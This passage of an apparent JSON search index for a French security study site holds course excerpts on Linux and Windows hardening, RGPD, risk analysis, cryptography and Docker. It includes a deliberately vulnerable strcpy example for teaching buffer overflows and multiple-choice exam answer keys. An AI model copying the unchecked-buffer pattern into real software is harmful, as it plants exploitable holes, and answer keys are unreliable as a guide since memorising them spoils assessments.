  "text": "8 Durcissement Linux Validé Partitionnement & montage Séparer / , /boot , /home , /tmp , /var , /var/log pour éviter la saturation et isoler les données. Options de montage : nodev (ignore les devices), nosuid (ignore SUID/SGID), noexec (ignore l'exécution). /tmp avec son propre FS ou tmpfs et noexec : un attaquant ne peut pas y installer de code exécutable. /boot non monté automatiquement, accessible uniquement à root ; System.map protégé (aide à construire des exploits noyau). Chiffrement LUKS pour les données au repos. Mot de passe GRUB pour empêcher la modification des options de démarrage. Comptes & services Désactiver les comptes inutilisés et les comptes de service (mot de passe invalide, shell nologin). Un compte dédié par service ; pas de nobody partagé. Interdire la connexion root à distance ( PermitRootLogin no ), utiliser sudo et des clés SSH. Expiration des sessions, bannièr"
 },
 {
  "page": "os.html",
  "url": "os.html#logs",
  "subject": "Sécurité des OS",
  "title": "Journalisation, audit & patch management",
  "text": "9 Journalisation, audit & patch management Validé Journalisation centralisée Les logs doivent être déportés vers un serveur central, de préférence en temps réel, et protégés en intégrité. Intérêts Conservation des preuves si le serveur est compromis. Détection et corrélation multi-serveurs. L'attaquant ne peut pas effacer ses traces localement. Conformité et audit. Inconvénients Charge réseau. Point de défaillance unique (SPOF). Latence possible. Le serveur de logs doit être lui-même sécurisé. Bonnes pratiques : NTP pour synchroniser les horodatages, TLS pour le transport, rotation/compression, rétention définie, accès restreint, alertes sur événements critiques, test de la chaîne de collecte. Outils : rsyslog , journald , auditd , SIEM (ELK, Splunk, Wazuh). Patch management Une mise à jour peut casser une application métier : incompatibilité, régression, arrêt de service. Dans une grand"
 },
 {
  "page": "os.html",
  "url": "os.html#bof",
  "subject": "Sécurité des OS",
  "title": "Buffer overflow & protections mémoire",
  "text": "10 Buffer overflow & protections mémoire Validé Un buffer overflow se produit quand un programme écrit plus de données que la taille allouée dans un tampon. Les données débordent sur les variables voisines, notamment l'adresse de retour sur la pile. L'attaquant peut alors détourner l'exécution vers son shellcode. void f(char *input) { char buf[20]; strcpy(buf, input); // pas de contrôle de taille } Protections Linux Protection Rôle Option / commande ASLR Randomise les adresses (pile, tas, libs). kernel.randomize_va_space=2 NX / DEP Marque la pile et le tas non exécutables. NX bit matériel. Stack canary Valeur sentinelle avant l'adresse de retour ; détecte l'écrasement. -fstack-protector PIE Exécutable position-independent, compatible ASLR. -fPIE -pie RELRO Protège la GOT (table des symboles) en lecture seule. -Wl,-z,relro,-z,now FORTIFY_SOURCE Vérifie les fonctions dangereuses ( strcpy ,"
 },
 {
  "page": "os.html",
  "url": "os.html#winarchi",
  "subject": "Sécurité des OS",
  "title": "Windows : architecture interne",
  "text": "11 Windows : architecture interne Validé Windows est un noyau hybride . On distingue le mode utilisateur (applications, services, DLL) et le mode noyau (Executive, Kernel, HAL, pilotes, hyperviseur). Composant Rôle Object Manager Création, nommage, référencement et destruction des objets (process, thread, fichier, token, clé de registre). Process Manager Processus et threads. Memory Manager Mémoire virtuelle, pagination, protection. I/O Manager Entrées/sorties et pilotes. Configuration Manager Registre Windows. Security Reference Monitor (SRM) Contrôle d'accès, vérification des droits, audit. Il applique la politique de sécurité. Cache Manager Cache des fichiers. Kernel Ordonnancement, interruptions, exceptions, synchronisation, changement de contexte. HAL Couche d'abstraction matérielle. Pilotes Interagissent avec le matériel ; beaucoup tournent en mode noyau, donc critiques. Hyperviseu"
 },
 {
  "page": "os.html",
  "url": "os.html#winsec",
  "subject": "Sécurité des OS",
  "title": "Windows : modèle de sécurité",
  "text": "12 Windows : modèle de sécurité Validé Le token d'accès À l'authentification, Windows construit un access token qui représente le contexte de sécurité : SID de l'utilisateur, SID des groupes, privilèges, niveau d'intégrité, session de logon. Chaque processus hérite d'un token. Security descriptor, DACL, SACL Propriétaire (SID). DACL : liste des autorisations/refus (qui peut faire quoi). SACL : liste d'audit (quels accès journaliser). ACE : entrée individuelle de la DACL/SACL. Le SRM compare le token de l'appelant au descripteur de sécurité de l'objet. Un refus explicite l'emporte généralement sur une autorisation. SID Identifiant de sécurité unique et immuable d'un compte, d'un groupe ou d'une machine. Il est utilisé dans les ACL et les tokens, pas « positionné sur une ressource ». SID bien connus : S-1-5-18 (SYSTEM), S-1-5-19 (LocalService), S-1-5-20 (NetworkService), S-1-5-32-544 (Admi"
 },
 {
  "page": "os.html",
  "url": "os.html#winauth",
  "subject": "Sécurité des OS",
  "title": "Windows : authentification & protections",
  "text": "13 Windows : authentification & protections Validé Le chemin d'une ouverture de session Winlogon gère les sessions interactives : ouverture/fermeture, verrouillage, Ctrl+Alt+Suppr, lancement de l'environnement utilisateur. LogonUI affiche l'interface de connexion et collecte les identifiants via les credential providers. LSASS authentifie, applique la politique locale, crée le token et gère certains secrets. SAM contient les comptes locaux ; Active Directory gère les comptes de domaine. Les 3 composants à ne pas confondre Winlogon : sessions interactives, Ctrl+Alt+Del, lancement de l'environnement. LSASS : authentification, politique, token, secrets. SRM : contrôle d'accès aux objets, audit. NTLM vs Kerberos NTLM Kerberos Type Challenge-response, hash NTLM. Tickets, KDC, TGT/TGS. Contexte Comptes locaux, workgroup, compatibilité. Active Directory. Attaques Pass-the-Hash, relay NTLM. Pass"
 },
 {
  "page": "os.html",
  "url": "os.html#wincis",
  "subject": "Sécurité des OS",
  "title": "Windows : CIS, EAL & audit",
  "text": "14 Windows : CIS, EAL & audit Validé Les recommandations CIS de l'annale Recommandation Pourquoi Exiger Ctrl+Alt+Del (désactiver « ne pas exiger ») Séquence d'attention sécurisée interceptée par le noyau ; empêche les faux écrans de connexion et le phishing. Interdire l'énumération anonyme SAM/partages Empêche un attaquant de lister les comptes et partages sans authentification ; réduit la surface de reconnaissance. UAC : détecter les installations et demander l'élévation Bloque l'installation silencieuse de malware ; applique le moindre privilège. Désactiver le service de géolocalisation Protection de la vie privée, réduction de la surface d'attaque, minimisation. Activer Secure Boot Vérifie la signature de la chaîne de démarrage ; bloque bootkits et rootkits. Aucun partage accessible anonymement Empêche la fuite de données et l'accès non authentifié. EAL4+ et C2 Common Criteria (ISO/IE"
 },
 {
  "page": "os.html",
  "url": "os.html#annales",
  "subject": "Sécurité des OS",
  "title": "Annales : QCM & questions ouvertes",
  "text": "15 Annales : QCM & questions ouvertes Validé Corrigé express — banque QCM Moodle Question Réponse Justification Noyau d'un OS a, c Programme en C/assembleur, s'exécute en mode privilégié. Minimisation a, b Suivi/mise à jour efficace + réduction de la surface d'attaque. Apache root puis www-data b Moindre privilège. SELinux b, d Cloisonnement + contrôle d'accès obligatoire (MAC). Défense en profondeur a, b Facilite la détection et la remédiation. Auth + chiffrement + firewall a Défense en profondeur. Répertoire sur disque séparé c /home (données utilisateurs). umask 002 0664 666 − 002 = 664. Bit SUID b Uniquement si le programme est de confiance. Premier programme utilisateur d systemd . Mots de passe a /etc/shadow . Noyau Linux b Monolithique modulaire (modules chargés à chaud). Erreur dans /etc/passwd GID + shell GID non numérique ; /bin/passwd n'est pas un shell valide. Lister les SUID"
 },
 {
  "page": "os.html",
  "url": "os.html#quiz",
  "subject": "Sécurité des OS",
  "title": "Quiz express",
  "text": "? Quiz express 10 questions tirées au hasard. Objectif : 8/10."
 },
 {
  "page": "os.html",
  "url": "os.html#flashcards",
  "subject": "Sécurité des OS",
  "title": "Flashcards",
  "text": "⚡ Flashcards Lancer les flashcards → Espace = retourner · ← → = naviguer"
 },
 {
  "page": "si.html",
  "url": "si.html#fond",
  "subject": "Sécurité des SI",
  "title": "SI, SSI, DICP & normes",
  "text": "1 SI, SSI, DICP & normes Validé Un système d'information est l'ensemble des moyens (organisation, acteurs, procédures, systèmes informatiques) nécessaires au traitement et à l'exploitation des informations, dans le respect de la réglementation. La SSI est l'ensemble des moyens techniques, organisationnels, juridiques et humains visant à empêcher l'utilisation ou l'accès non autorisé, le mauvais usage, la modification ou le détournement du SI. Critère Définition Exemple Confidentialité Seules les personnes autorisées accèdent à l'information. Chiffrement, contrôle d'accès, cloisonnement. Intégrité L'information est exacte et complète ; toute modification est détectée. Hash, signature, logs, contrôle de version. Disponibilité L'information est accessible au moment voulu. Redondance, sauvegardes, PCA/PRA, anti-DDoS. Preuve / traçabilité On peut retrouver qui a fait quoi, quand et comment. L"
 },
 {
  "page": "si.html",
  "url": "si.html#rgpd",
  "subject": "Sécurité des SI",
  "title": "RGPD & données de santé",
  "text": "2 RGPD & données de santé Validé Le RGPD s'applique à toute donnée personnelle : information relative à une personne physique identifiée ou identifiable. Les données de santé et les données biométriques sont des données sensibles : leur traitement est interdit par principe, sauf exception (consentement explicite, soins, obligation légale, intérêt public). Les 7 principes Licéité, loyauté, transparence : base légale et information claire. Limitation des finalités : collecter pour un objectif déterminé, pas pour « plus tard ». Minimisation : uniquement les données nécessaires. Exactitude : données à jour, rectification possible. Limitation de conservation : durée définie, suppression ensuite. Intégrité et confidentialité : sécurité adaptée au risque. Responsabilité : pouvoir démontrer la conformité (registre, documentation, AIPD). Les droits des personnes Information, accès, rectification,"
 },
 {
  "page": "si.html",
  "url": "si.html#risque",
  "subject": "Sécurité des SI",
  "title": "Analyse de risques",
  "text": "3 Analyse de risques Validé Risque = menace × vulnérabilité × impact. On parle aussi de vraisemblance × impact . Le risque est l'effet de l'incertitude sur l'atteinte des objectifs. Concept Définition Exemple cabinet médical Actif primaire Processus, information, donnée à forte valeur. Dossier patient, rendez-vous, facturation. Actif secondaire Support : matériel, logiciel, réseau, personnel, site. Serveur local, PC Windows 11, box, Wi-Fi, disque de sauvegarde. Menace Cause potentielle d'incident. Hacker, ransomware, employé malveillant, vol, incendie, panne. Vulnérabilité Faiblesse exploitable. Mots de passe partagés, Wi-Fi unique, données non chiffrées, pas de MFA. Impact Conséquence sur le DICP, le métier, le legal, l'image. Fuite de données, soins retardés, sanction CNIL, perte de confiance. Risque résiduel Risque restant après mesures. Risque accepté et documenté par la direction. L"
 },
 {
  "page": "si.html",
  "url": "si.html#crypto",
  "subject": "Sécurité des SI",
  "title": "Cryptographie",
  "text": "4 Cryptographie Validé La cryptologie comprend la cryptographie (écrire secret), la cryptanalyse (casser) et la stéganographie (dissimuler). On ne dit pas « crypter » mais chiffrer . Symétrique Asymétrique Clés Une clé secrète partagée. Une paire : publique / privée. Vitesse Rapide, adapté aux gros volumes. Lent (100 à 1000× plus lent). Exemples AES, DES, 3DES, RC4, ChaCha20. RSA, ECC, ElGamal. Usage Chiffrement des données, session TLS. Échange de clés, signature, certificats. Limite Distribution de la clé : n(n−1)/2 clés. Lenteur, authentification de la clé publique. Chiffrement hybride On génère une clé de session symétrique, on la chiffre avec la clé publique du destinataire, puis on chiffre le message avec la clé de session. C'est le modèle de TLS : asymétrique pour l'échange de clés, symétrique pour les données. Hash, MAC, signature Hash : empreinte irréversible (SHA-256). Propriét"
 },
 {
  "page": "si.html",
  "url": "si.html#reseau",
  "subject": "Sécurité des SI",
  "title": "Réseau & cloud",
  "text": "5 Réseau & cloud Validé Les concepts réseau sont détaillés dans la fiche Réseaux ; ici, retiens les mesures à citer dans un audit SI. Segmentation : VLAN, sous-réseaux, zones de confiance, DMZ. Firewall : deny all par défaut, règles explicites, logs. Proxy / reverse proxy : filtrage, rupture protocolaire, WAF. IDS/IPS : détection et blocage, placement aux points critiques. VPN : accès distant chiffré, IPsec ou SSL, MFA. 802.1X / RADIUS : authentification des accès filaires et Wi-Fi. Wi-Fi : WPA2/3 Enterprise, SSID séparés, réseau invité isolé. DNSSEC, TLS, SSH : protocoles sécurisés. Administration : bastion, réseau dédié, MFA, pas d'admin exposé. Cloud : les questions à poser Qui a accès aux données ? Comment sont-elles isolées ? Chiffrement au repos et en transit ? Gestion des clés ? Localisation des données et régime juridique (RGPD, souveraineté). Réversibilité, export, délais de res"
 },
 {
  "page": "si.html",
  "url": "si.html#iam",
  "subject": "Sécurité des SI",
  "title": "IAM, LDAP & Active Directory",
  "text": "6 IAM, LDAP & Active Directory Validé IAM (Identity and Access Management) répond à « qui a accès à quoi ? ». Il couvre l'identification, l'authentification, l'autorisation et la gouvernance des identités. Étape Question Exemple Identification Qui demande l'accès ? Login, email, certificat. Authentification Est-ce bien lui ? Mot de passe + MFA, clé, biométrie. Autorisation A-t-il le droit ? RBAC, ACL, politique. Traçabilité Qu'a-t-il fait ? Logs, audit. Modèles de contrôle d'accès DAC : le propriétaire décide (Unix). MAC : politique globale (SELinux, AppArmor). RBAC : rôles et permissions (le plus courant en entreprise). ABAC : attributs (contexte, heure, service, risque). Bonnes pratiques IAM Moindre privilège et séparation des tâches. Cycle de vie : arrivée, mutation, départ (joiner/mover/leaver). Revue périodique des accès, suppression des comptes orphelins. MFA pour les accès sensibl"
 },
 {
  "page": "si.html",
  "url": "si.html#web",
  "subject": "Sécurité des SI",
  "title": "Sécurité applicative",
  "text": "7 Sécurité applicative Validé Une application est sûre si elle est conçue, développée, déployée et maintenue avec la sécurité. La sécurité n'est pas un module qu'on ajoute à la fin. Security by design — les 10 principes Minimiser la surface d'attaque. Valeurs par défaut sécurisées. Moindre privilège. Défense en profondeur. Échouer en sécurité ( fail securely ). Ne pas faire confiance aux services externes. Séparation des tâches. Pas de sécurité par l'obscurité. Garder la sécurité simple. Résoudre correctement les problèmes de sécurité. Privacy by design — 7 principes Proactif, protection par défaut, protection intégrée à la conception, sécurité de bout en bout, visibilité/transparence, respect de la vie privée, minimisation. OWASP Top 10 — 2021 Risque Défense A01 Broken Access Control Contrôle serveur, deny by default, tests d'autorisation. A02 Cryptographic Failures TLS, hash fort, pas "
 },
 {
  "page": "si.html",
  "url": "si.html#durci",
  "subject": "Sécurité des SI",
  "title": "Durcissement & patch management",
  "text": "8 Durcissement & patch management Validé Le durcissement réduit la surface d'attaque : moins de services, moins de comptes, moins de ports, moins de logiciels, des configurations sûres. Checklist Inventaire des actifs et des versions. Système minimal, pas de GUI inutile. Suppression des comptes et services par défaut. Mots de passe forts + MFA. Moindre privilège, sudo, RBAC. Pare-feu local + segmentation. Chiffrement des disques et des sauvegardes. Journalisation et audit. Mises à jour et patch management. Antivirus / EPP / EDR. Contrôle des USB et des logiciels. Sauvegardes testées. Documentation et baseline. Revue périodique. Référentiels : CIS Benchmarks, ANSSI, Microsoft Security Baselines, STIG, BSI. Patch management : veille, inventaire, test, pilote, déploiement, vérification, rollback. Une fenêtre de vulnérabilité est la période entre la publication de la faille et l'application "
 },
 {
  "page": "si.html",
  "url": "si.html#supervision",
  "subject": "Sécurité des SI",
  "title": "Supervision & gestion d'incidents",
  "text": "9 Supervision & gestion d'incidents Validé La supervision ne se limite pas à collecter des logs : il faut analyser , corréler , investiguer et déclencher des actions. SIEM : collecte, normalisation, corrélation, alertes, tableaux de bord. SOC : équipe qui surveille et répond 24/7. SOAR : automatisation des réponses (playbooks). IDS/IPS : détection réseau, signatures/anomalies. EDR/XDR : détection endpoint et étendue. VDS : scanner de vulnérabilités. Gestion d'incident — 6 phases Préparation : plans, contacts, outils, exercices. Détection & qualification : alerte, gravité, périmètre. Confinement : isoler les systèmes, bloquer les comptes, préserver les preuves. Éradication : supprimer la cause (malware, accès). Rétablissement : restaurer, vérifier, surveiller. Retour d'expérience : cause racine, mesures, mise à jour du plan. Ransomware : isoler, ne pas payer, identifier le périmètre, rest"
 },
 {
  "page": "si.html",
  "url": "si.html#audit",
  "subject": "Sécurité des SI",
  "title": "Audit vs pentest",
  "text": "10 Audit vs pentest Validé Audit Pentest Objectif Vérifier la conformité à un référentiel. Éprouver l'efficacité réelle des protections. Approche Documentaire, organisationnelle, technique. Offensive, par scénarios d'attaque. Résultat Écarts, note de conformité, recommandations. Preuves d'exploitation, impact, CVSS, remédiation. Limite Ne prouve pas qu'une attaque réussirait. Une intrusion non réussie ne prouve pas la sécurité parfaite. Types d'audit : organisationnel, physique, politique de sécurité, mise en œuvre, projet, efficacité, architecture, configuration, code, vulnérabilités. Modes de pentest : black-box, grey-box, white-box. Démarche : préparation, réalisation, restitution. VDS : pour chaque port ouvert, identifie le service, le logiciel, la version, puis interroge une base de CVE. Produit un rapport mais beaucoup de faux positifs. Pentest : confirme l'exploitabilité et l'impa"
 },
 {
  "page": "si.html",
  "url": "si.html#pca",
  "subject": "Sécurité des SI",
  "title": "PCA / PRA & continuité",
  "text": "11 PCA / PRA & continuité Validé Plan Objectif Exemple PCA Continuer l'activité en mode dégradé pendant un sinistre. Télétravail, site de repli, procédures manuelles. PRA Restaurer ou basculer le SI sur un site de secours dans un délai défini. Bascule d'un datacenter sur un site de secours. PSI Plan de secours informatique : restauration des services IT. Restauration des serveurs, données, réseau. PGC Gestion de crise pour les situations non anticipées. Cellule de crise, communication, décisions. BIA & métriques BIA (Business Impact Analysis) : identifier les processus critiques, leurs dépendances et l'impact d'une interruption. RTO : durée maximale d'interruption acceptable avant restauration. RPO : perte de données maximale acceptable (fréquence des sauvegardes). MTPD : durée maximale de perturbation tolérable. Exemple : dossier patient — RTO 4 h, RPO 15 min ; facturation — RTO 24 h, R"
 },
 {
  "page": "si.html",
  "url": "si.html#methode",
  "subject": "Sécurité des SI",
  "title": "Méthode du cas pratique",
  "text": "12 Méthode du cas pratique Validé Quel que soit le schéma, applique cette grille. Elle marche pour un cabinet médical, un interphone connecté, une PME, une mairie. Étape Questions à te poser Livrable dans la copie 1. Contexte Quelle activité ? Quelles données ? Qui accède ? Quelles contraintes légales ? 2–3 phrases + périmètre. 2. Actifs Quels processus, données, serveurs, postes, réseaux, personnes, locaux ? Tableau actifs primaires / supports. 3. Données & conformité Données personnelles ? sensibles ? base légale ? durée ? droits ? Paragraphe RGPD + mesures. 4. Menaces Internes/externes, accidentelles/malveillantes, environnementales. Liste classée. 5. Vulnérabilités Techniques, organisationnelles, humaines, physiques. Liste reliée aux actifs. 6. Impacts CIA, légal, financier, réputation, sécurité des patients. Tableau impact / gravité. 7. Risques Vraisemblance × impact ; quels sont le"
 },
 {
  "page": "si.html",
  "url": "si.html#cas",
  "subject": "Sécurité des SI",
  "title": "Cas corrigé : cabinet médical",
  "text": "13 Cas corrigé : cabinet médical Validé Schéma type : site web vitrine hébergé chez un prestataire ; messagerie professionnelle non déléguée ; logiciel de gestion des dossiers patients installé sur un serveur local ; box Internet ; Wi-Fi partagé entre patients et personnel ; postes Windows 11 ; disque dur externe de sauvegarde. 1. Contexte & actifs Cabinet médical traitant des données de santé. Actifs primaires : dossiers patients, rendez-vous, ordonnances, facturation, site vitrine. Actifs supports : serveur local, postes Windows 11, box, Wi-Fi, disque de sauvegarde, prestataire web, messagerie, personnel. 2. Données & RGPD Les données sont personnelles et sensibles (santé, identité, coordonnées, éventuellement photos/biométrie). Il faut : base légale (soins), information des patients, minimisation, durée de conservation, droits d'accès/rectification/effacement, registre, AIPD si nécess"
 },
 {
  "page": "si.html",
  "url": "si.html#annales",
  "subject": "Sécurité des SI",
  "title": "Autres cas & annales",
  "text": "14 Autres cas & annales Validé Cas « interphone connecté » — points de vigilance Données : numéro d'appartement + nom + prénom + téléphone = données personnelles ; photos en cas d'absence = données biométriques potentielles → RGPD, minimisation, droit à l'effacement, information des visiteurs. Vulnérabilités : base non chiffrée, pas de mise à jour, pas de firewall/IDS, services inutiles, accès physique à l'interphone, Wi-Fi partagé, mots de passe faibles. Recommandations : chiffrement, durcissement, firewall + IDS/IPS, VLAN/hyperviseur avec VM firewall et VM web, reverse proxy, désactivation des services, MFA, formation, sauvegardes, conformité RGPD/ISO 27001. Question type — « Analysez les risques du SI » Utilise la grille de la section 12. Commence par les actifs, puis les couples menace/vulnérabilité, puis les impacts. Termine par une matrice et 3 risques majeurs. Ne liste pas des out"
 },
 {
  "page": "si.html",
  "url": "si.html#quiz",
  "subject": "Sécurité des SI",
  "title": "Quiz express",
  "text": "? Quiz express 10 questions tirées au hasard. Objectif : 8/10."
 },
 {
  "page": "si.html",
  "url": "si.html#flashcards",
  "subject": "Sécurité des SI",
  "title": "Flashcards",
  "text": "⚡ Flashcards Lancer les flashcards → Espace = retourner · ← → = naviguer"
 },
 {
  "page": "vs.html",
  "url": "vs.html#def",
  "subject": "Virtualisation & Stockage",
  "title": "Définition & domaines",
  "text": "1 Définition & domaines Validé La virtualisation est l'ensemble des techniques qui permettent de faire fonctionner plusieurs systèmes d'exploitation ou environnements sur une même machine physique, en abstraisant les ressources (CPU, mémoire, stockage, réseau). Elle repose sur trois éléments : abstraction des ressources, répartition entre environnements, création d'environnements virtuels isolés. Domaine Principe Exemple Serveurs Plusieurs serveurs virtuels sur un serveur physique. ESXi, Hyper-V, Proxmox. Postes de travail Bureau virtuel exécuté à distance. VDI (Virtual Desktop Infrastructure), Citrix, Horizon. Applications Isoler une application de l'OS. Wine, ThinApp, App-V, conteneurs applicatifs. Réseau Fonctions réseau en logiciel (SDN). vSwitch, NSX, VLAN, VXLAN. Stockage Agréger et abstraire les ressources de stockage. Datastore, vSAN, SAN, NAS. Vocabulaire Hôte : machine physique"
 },
 {
  "page": "vs.html",
  "url": "vs.html#avantages",
  "subject": "Virtualisation & Stockage",
  "title": "Avantages & consolidation",
  "text": "2 Avantages & consolidation Validé Avantages Consolidation et meilleure utilisation des ressources. Réduction des coûts (matériel, énergie, climatisation, espace, personnel). Déploiement rapide, agilité, automatisation. Isolation des environnements. Haute disponibilité, reprise après sinistre, PRA. Tests, snapshots, clones, templates. Support de systèmes legacy. Green IT. Inconvénients Surcoût de performance (couche d'abstraction). Complexité de gestion et de compétences. Point de défaillance unique (serveur, stockage, hyperviseur). Licences et coûts cachés. Sécurité : surface d'attaque et mouvements latéraux. Dépendance au fournisseur. Planification de capacité difficile. Consolidation Consolidation de serveurs : regrouper plusieurs serveurs physiques sous-utilisés sur moins de serveurs, grâce aux VM, pour optimiser les ressources et réduire les coûts. Consolidation du stockage : centra"
 },
 {
  "page": "vs.html",
  "url": "vs.html#hyper",
  "subject": "Virtualisation & Stockage",
  "title": "Hyperviseurs & types de virtualisation",
  "text": "3 Hyperviseurs & types de virtualisation Validé Type 1 (bare metal) Type 2 (hosted) Installation Directement sur le matériel. Sur un OS hôte existant. Performance Meilleure, moins de couches. Plus faible, dépend de l'OS hôte. Usage Datacenter, production. Poste de travail, tests, développement. Exemples VMware ESXi, Hyper-V, Proxmox VE, Xen, KVM. VirtualBox, VMware Workstation, QEMU, Parallels. Natif ? Oui. Non. Les techniques Technique Principe Avantages / limites Exemples Virtualisation complète Le matériel est émulé ; l'OS invité n'est pas modifié et croit être sur une machine physique. Très compatible ; performance moindre sans assistance matérielle. VirtualBox, VMware, QEMU. Paravirtualisation L'OS invité est modifié pour appeler l'hyperviseur (hypercalls). Meilleures performances ; nécessite un OS adapté. Xen, KVM, ESXi (assisté). Émulation Le logiciel simule complètement le matéri"
 },
 {
  "page": "vs.html",
  "url": "vs.html#reseau",
  "subject": "Virtualisation & Stockage",
  "title": "Réseau virtuel",
  "text": "4 Réseau virtuel Validé Le vSwitch Un commutateur virtuel relie les VM entre elles et au réseau physique. Il fonctionne comme un switch : ports, VLAN, uplinks, port groups. Il est interne à l'hôte (vSwitch standard) ou distribué et centralisé par vCenter (vDS). Port group : regroupement de ports avec une politique (VLAN, sécurité, teaming). Uplink : carte physique de l'hôte reliée au switch physique. VMkernel : interface du noyau ESXi pour la gestion, vMotion, iSCSI, NFS, vSAN. VLAN : segmentation logique du trafic. MTU : à aligner avec le switch physique pour les jumbo frames. Les 3 types de réseau VMware Type Fonctionnement Accès Usage Bridged La VM est connectée directement au réseau physique, avec sa propre IP sur le même subnet que l'hôte. Réseau local + Internet. Serveur, tests réseau, visibilité directe. NAT La VM sort via l'hôte, qui fait la traduction d'adresse ; elle n'est pas "
 },
 {
  "page": "vs.html",
  "url": "vs.html#stockage",
  "subject": "Virtualisation & Stockage",
  "title": "Architectures de stockage",
  "text": "5 Architectures de stockage Validé DAS NAS SAN Signification Direct Attached Storage Network Attached Storage Storage Area Network Niveau Bloc, directement attaché au serveur. Fichier (NFS, SMB). Bloc (FC, iSCSI, FCoE). Réseau Aucun réseau de stockage dédié. Ethernet standard. Réseau dédié haute performance. Partage Non partagé (ou limité). Partagé entre clients. Partagé entre serveurs. Performance Bonne, locale. Moyenne, dépend du réseau. Très bonne, faible latence. Coût Faible. Moyen. Élevé. Usage Serveur isolé, petit site. Partage de fichiers, NFS datastore. Datacenter, bases de données, VMFS. Stockage VMware VMFS : système de fichiers cluster VMware pour le stockage bloc (FC/iSCSI). Permet à plusieurs hôtes d'accéder au même datastore. NFS : datastore fichier sur NAS, simple et partagé. vSAN : stockage hyperconvergé ; agrège les disques locaux des hôtes en un datastore distribué. iSC"
 },
 {
  "page": "vs.html",
  "url": "vs.html#vmware",
  "subject": "Virtualisation & Stockage",
  "title": "VMware vSphere",
  "text": "6 VMware vSphere Validé Composant Rôle ESXi Hyperviseur type 1 bare metal. Exécute les VM. vCenter Server Gestion centralisée : hôtes, VM, clusters, stockage, réseau, alarmes, permissions. VCSA vCenter Server Appliance, VM pré-packagée. vSphere Client Interface HTML5 d'administration. DCUI Interface locale de configuration initiale d'ESXi. SSO Authentification unique VMware. RBAC Rôles et permissions sur les objets vSphere. vSwitch / vDS Switch virtuel local / distribué. VMkernel Interface réseau du noyau pour gestion, vMotion, stockage. Datastore Espace logique de stockage des fichiers VM. Cluster Ensemble d'hôtes partageant ressources et services (HA, DRS). HA Redémarrage automatique des VM sur un autre hôte après panne. DRS Rééquilibrage automatique des ressources CPU/mémoire. FT Redondance synchrone d'une VM (shadow VM), zéro downtime. vMotion Migration à chaud des CPU/mémoire entre "
 },
 {
  "page": "vs.html",
  "url": "vs.html#migrations",
  "subject": "Virtualisation & Stockage",
  "title": "Migrations, snapshots, clones",
  "text": "7 Migrations, snapshots, clones Validé Migration De → vers Objectif P2V Physique → virtuel Consolider, moderniser, réduire le matériel. V2V Virtuel → virtuel (autre hyperviseur) Changer de plateforme, éviter le verrouillage. V2P Virtuel → physique Repasser sur du matériel dédié (rare). P2P Physique → physique Remplacement matériel. X2X Tout → tout Terme générique pour les migrations. V2V / V2P / P2V — Conversion de format et de pilotes. Migration à chaud : VM allumée, sans interruption (vMotion). Migration à froid : VM arrêtée ou suspendue. vMotion : hôte à hôte. Storage vMotion : datastore à datastore. Les deux peuvent être combinés. Snapshot Capture l'état du disque, de la mémoire et de la configuration à un instant T. Utile avant une mise à jour ou un test. Ce n'est pas une sauvegarde : il dépend du datastore et de la VM ; une chaîne longue dégrade les performances et consomme de l'es"
 },
 {
  "page": "vs.html",
  "url": "vs.html#conteneurs",
  "subject": "Virtualisation & Stockage",
  "title": "Conteneurs & Docker",
  "text": "8 Conteneurs & Docker Validé Un conteneur est une unité logicielle isolée qui embarque l'application et ses dépendances, mais partage le noyau de l'hôte. Il est plus léger et démarre plus vite qu'une VM. VM Conteneur OS invité Complet, par VM. Aucun ; partage du noyau. Isolation Forte (matériel virtualisé). Plus faible (processus isolé). Poids Go. Mo. Démarrage Minutes. Secondes. Densité Faible. Élevée. Usage OS différents, isolation forte. Microservices, CI/CD, applications portables. Namespaces & cgroups Namespaces : isolation de ce que le processus voit (PID, réseau, montages, UTS, IPC, utilisateurs). cgroups : limitation et répartition des ressources (CPU, mémoire, I/O). Docker n'est pas une technologie de virtualisation matérielle : c'est une plateforme de conteneurisation basée sur les primitives Linux (namespaces, cgroups, capabilities). Docker Docker est une plateforme open sourc"
 },
 {
  "page": "vs.html",
  "url": "vs.html#docker",
  "subject": "Virtualisation & Stockage",
  "title": "Commandes Docker",
  "text": "9 Commandes Docker Validé Besoin Commande Lister les images docker images Lister les conteneurs actifs docker ps Lister tous les conteneurs docker ps -a Télécharger une image docker pull nginx:latest Construire une image docker build -t monapp:1.0 . Lancer un conteneur docker run -d -p 8080:80 --name web nginx Exécuter une commande dans un conteneur docker exec -it web bash Voir les logs docker logs -f web Arrêter / démarrer docker stop web / docker start web Supprimer un conteneur docker rm web Supprimer une image docker rmi monapp:1.0 Créer un volume docker volume create data Inspecter docker inspect web Nettoyer l'inutilisé docker system prune -a Supprimer tous les conteneurs (actifs/arrêtés) docker rm -f $(docker ps -aq) Processus de docker run Le client envoie la requête au daemon. Le daemon vérifie si l'image existe localement ; sinon il la télécharge depuis le registre. Il crée un"
 },
 {
  "page": "vs.html",
  "url": "vs.html#dockerfile",
  "subject": "Virtualisation & Stockage",
  "title": "Dockerfile",
  "text": "10 Dockerfile Validé Un Dockerfile est un fichier texte contenant les instructions de construction d'une image. Chaque instruction crée une couche. Instruction Rôle Exemple FROM Image de base. Obligatoire (sauf cas avancé). FROM ubuntu:22.04 RUN Exécute une commande pendant la construction. RUN apt-get update && apt-get install -y nginx COPY Copie des fichiers locaux dans l'image. COPY . /app ADD Comme COPY, avec support URL/tar et décompression. ADD app.tar.gz /app WORKDIR Définit le répertoire de travail. WORKDIR /app EXPOSE Déclare le port d'écoute (documentation, pas publication). EXPOSE 80 ENV Variable d'environnement persistante dans l'image. ENV NODE_ENV=production ARG Variable de build, non persistante. ARG VERSION=1.0 CMD Commande par défaut au démarrage ; peut être remplacée. CMD [\"nginx\", \"-g\", \"daemon off;\"] ENTRYPOINT Point d'entrée fixe ; les arguments de docker run s'y ajo"
 },
 {
  "page": "vs.html",
  "url": "vs.html#compose",
  "subject": "Virtualisation & Stockage",
  "title": "Docker Compose",
